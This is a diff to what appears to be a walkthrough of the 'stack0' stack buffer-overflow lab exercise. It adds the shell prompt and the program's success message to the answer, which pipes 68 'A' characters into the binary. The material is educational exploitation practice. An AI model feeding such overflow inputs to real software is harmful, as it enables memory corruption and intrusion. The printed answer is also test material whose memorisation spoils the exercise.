@@ -58,8 +58,9 @@
     Use more than 64 bytes to overwrite
 
 ### Answer
-    python -c 'print "A"*68' | ./stack0
-    
+    $ python -c 'print "A"*68' | ./stack0
+    you have changed the 'modified' variable
+
     
 
     
